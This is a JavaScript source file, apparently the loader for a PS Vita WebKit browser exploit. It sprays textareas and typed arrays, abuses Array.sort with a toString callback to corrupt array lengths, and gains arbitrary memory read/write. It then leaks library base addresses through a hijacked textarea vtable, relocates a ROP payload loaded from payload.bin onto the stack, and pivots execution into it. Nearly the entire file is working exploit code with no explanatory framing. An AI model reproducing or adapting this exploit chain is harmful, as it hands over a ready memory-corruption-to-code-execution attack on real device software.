// defined here with 'var' to make sure they are uglified
var spray_size, textareas, buffers, buffer_len, textarea_cookie, textarea_cookie2, corrupted, found_element, search_start, heap_addr, textarea_addr, sp;
var SceWebKit_base, SceLibc_base, SceLibKernel_base, ScePsp2Compat_base, SceWebFiltering_base, SceLibHttp_base, SceNet_base, SceNetCtl_base, SceAppMgr_base;
var rop_data_base, rop_code_base;

#if STATIC
var request = new XMLHttpRequest();
request.open("GET", "payload.bin", true);
request.responseType = "arraybuffer";
var payload, relocs;
request.onload = function(event) {
	var buffer = request.response;
	var whole = new Uint32Array(buffer, 0);
	var rop_size_words = whole[0];
	payload = new Uint32Array(buffer, 4, rop_size_words);
	relocs = new Uint8Array(buffer, rop_size_words * 4 + 4);
	do_exploit();
}

request.send();
#endif

#if STATIC
function do_exploit() {
#endif

var rop_header_and_data_size = 0x40 + payload[0x10/4];
rop_header_and_data_size /= 4;
// huge = new Uint32Array(64 * 1024 * 1024 / 4);
// mem = 0x83500000 + 0x1000; // a part of 'huge' will always be here so we can freely use this addr for tmp data

var _dview = null;
// u2d/d2u taken from PSA-2013-0903
// wraps two uint32s into double precision
function u2d(low,hi)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0,hi);
	_dview.setUint32(4,low);
	return _dview.getFloat64(0);	
}

function d2u(d)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0,d);
	return { low: _dview.getUint32(4), 
	         hi:  _dview.getUint32(0) };    
}

var first = 0;
var second = 0;

var backup = new Uint32Array(0x400);

function read_mov_r12(addr) {
	first = u32[addr/4];
	second = u32[addr/4 + 1];
	return ((((first & 0xFFF) | ((first & 0xF0000) >> 4)) & 0xFFFF) | ((((second & 0xFFF) | ((second & 0xF0000) >> 4)) & 0xFFFF) << 16)) >>> 0;
}

// spray buffers/textareas/whatever
// interleave buffers and textareas

spray_size = 0x4000;

textareas = new Array(spray_size);
buffers = new Array(spray_size);
buffer_len = 0x1344;
textarea_cookie = 0x66656463;
textarea_cookie2 = 0x55555555;
for (var i = 0; i < buffers.length; ++i) {
	buffers[i] = new Uint32Array(buffer_len / 4);
	var e = document.createElement("textarea");
	e.rows = textarea_cookie;
	textareas[i] = e;
}

for (var i = 0; i < 0x400; ++i) {
	var e = document.createElement("textarea");
	e.rows = textarea_cookie;
	textareas.push(e);
}

var almost_oversize = 0x3000;
var foo = Array.prototype.constructor.apply(null, new Array(almost_oversize));
var normal_length = 0x800;
var fu = new Array(normal_length);
var o = {};
var arrays = new Array(0x100);
o.toString = function () {
	foo.push(12345);
	for (var i = 0; i < arrays.length; ++i) {
		var bar = Array.prototype.constructor.apply(null, fu);
		bar[0] = 0;
		bar[1] = 1;
		bar[2] = 2;
		arrays[i] = bar;
	}
	return "";
}
foo[0] = o;
var len = u2d(0x80000000, 0x80000000);
for (var i = 1; i < 0x2000; ++i)
	foo[i] = len;
foo.sort();

contents = "";
cur = 0;

o.toString = function() {};

// find corrupted JSArray

var arr = null;

for (var i = 0; i < arrays.length; ++i) {
	if (arrays[i].length != normal_length) {
		arr = arrays[i];
		break;
	}
}

if (arr == null) {
	alert("restart the browser");
	while(1) {}
}

// use corrupted JSArray to corrupt a Uint32Array

// alert("fakelen? " + arr.length.toString(16) + " at " + i);
var start = 0x20000000-0x11000;
for(;; start--) {
	if (arr[start] != 0) {
		_dview.setFloat64(0, arr[start]);
		// alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));
		if (_dview.getUint32(0) == buffer_len / 4) {
			//alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));
			//alert("found something");
			_dview.setUint32(0, 0xEFFFFFE0);
			arr[start] = _dview.getFloat64(0); // buffer size

			_dview.setFloat64(0, arr[start-2]);
			heap_addr = _dview.getUint32(4); // leak some heap address
			//alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));;
			_dview.setUint32(4, 0)
			_dview.setUint32(0, 0x80000000);
			arr[start-2] = _dview.getFloat64(0); // buffer offset
			break;
		}
	}
}

// find corrupted Uint32Array
corrupted = null;
for (var i = 0; i < buffers.length; ++i) {
	if (buffers[i].byteLength != buffer_len) {
		corrupted = buffers[i];
		break;
	}
}
if (!corrupted) {
	alert("failed");
	while(1){}
}
// alert("corrupted buffer " + corrupted + " len " + corrupted.byteLength.toString(16));

// u32 = arbitrary rw
var u32 = corrupted;

var some_space = heap_addr;
// alert("heap addr 0x" + heap_addr.toString(16));
search_start = heap_addr;

for (var addr = search_start/4; addr < search_start/4 + 0x4000; ++addr) {
	if (u32[addr] == textarea_cookie) {
		// alert("Found textarea.rows at addr 0x" + (addr * 4).toString(16));
		u32[addr] = textarea_cookie2;
		textarea_addr = addr * 4;
		found_element = true;
		break;
	}
}

if (!found_element) {
	alert("Did not find Element signature");
	while(1){}
}

/*
	Change the rows of the Element object then scan the array of
	sprayed objects to find an object whose rows have been changed
*/
var found_corrupted = false;
var corrupted_textarea;
for (var i = 0; i < textareas.length; ++i) {
	if (textareas[i].rows == textarea_cookie2) {
		corrupted_textarea = textareas[i];
		// alert("Found corrupted textarea at index #" + i);
		found_corrupted = true;
		break;
	}
}

if (!found_corrupted) {
	alert("Did not find corrupted textarea");
	while(1){}
}

var vtidx = textarea_addr - 0x70;
var textareavptr = u32[vtidx / 4];
// alert("Textarea vptr: 0x" + textareavptr.toString(16));

SceWebKit_base = textareavptr - 0xabb65c;
SceLibc_base = read_mov_r12(SceWebKit_base + 0x85F504) - 0xfa49;
SceLibKernel_base = read_mov_r12(SceWebKit_base + 0x85F464) - 0x9031;
ScePsp2Compat_base = read_mov_r12(SceWebKit_base + 0x85D2E4) - 0x22d65;
SceWebFiltering_base = read_mov_r12(ScePsp2Compat_base + 0x2c688c) - 0x9e5;
SceLibHttp_base = read_mov_r12(SceWebFiltering_base + 0x3bc4) - 0xdc2d;
SceNet_base = read_mov_r12(SceWebKit_base + 0x85F414) - 0x23ED;
SceNetCtl_base = read_mov_r12(SceLibHttp_base + 0x18BF4) - 0xD59;
SceAppMgr_base = read_mov_r12(SceNetCtl_base + 0x9AB8) - 0x49CD;

// copy vtable
for (var i = 0; i < 0x40; i++)
	u32[some_space / 4 + i] = u32[textareavptr / 4 + i];

u32[vtidx / 4] = some_space;

// backup our obj
for (var i = 0; i < 0x30; ++i)
	backup[i] = u32[vtidx/4 + i];

// call setjmp and leak stack base
u32[some_space / 4 + 0x4e] = SceLibc_base + 0x14070|1; // setjmp
corrupted_textarea.scrollLeft = 0; // call setjmp

sp = (u32[vtidx/4 + 8] ^ ((u32[vtidx/4 + 9] ^ (SceWebKit_base + 0x317929)) >>> 0)) >>> 0;
#if STATIC
sp -= 0xf02c0;
#else
sp -= 0xef818;
#endif
// TODO: this is supposed to always be either 0x82510000 or 0x82610000 but sometimes if you
// modify code above the stack gets different and we get a different value, in which case it
// might be a good idea to uncomment the commented line below
#if !RELEASE
//alert(sp.toString(16));
#endif
// sp += 0x10000;

// restore our obj
for (var i = 0; i < 0x30; ++i)
	u32[vtidx/4 + i] = backup[i];

// relocate the payload
rop_data_base = sp + 0x40;
rop_code_base = sp + 0x10000;

addr = sp / 4;
// Since relocs are applied to the whole rop binary, not just code/data sections, we replicate
// this behavior here. However, we split it into data section (placed at the top of the stack)
// and code section (placed at stack + some big offset)
for (var i = 0; i < payload.length; ++i, ++addr) {
	if (i == rop_header_and_data_size)
		addr = rop_code_base / 4;

	switch (relocs[i]) {
	case 0:
		u32[addr] = payload[i];
		break
	case 1:
		u32[addr] = payload[i] + rop_data_base;
		break;
	case 2:
		u32[addr] = payload[i] + SceWebKit_base;
		break;
	case 3:
		u32[addr] = payload[i] + SceLibKernel_base;
		break;
	case 4:
		u32[addr] = payload[i] + SceLibc_base;
		break;
	case 5:
		u32[addr] = payload[i] + SceLibHttp_base;
		break;
	case 6:
		u32[addr] = payload[i] + SceNet_base;
		break;
	case 7:
		u32[addr] = payload[i] + SceAppMgr_base;
		break;
	default:
		alert("wtf?");
		alert(i + " " + relocs[i]);
	}
}

// var sp = mem + 0x10000; // sp = 0x82610000
// function pointer
u32[some_space / 4 + 0x4e] = SceWebKit_base + 0x54c8; //54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}

var ldm_data = some_space + 0x100;
u32[ldm_data/4 + 5] = rop_code_base;       // sp
u32[ldm_data/4 + 6] = SceWebKit_base + 0xc048a|1;  // pc = pop {pc}

corrupted_textarea.scrollLeft = ldm_data; // trigger ropchain, r1=arg

alert("that's it");

#if STATIC
}
#endif
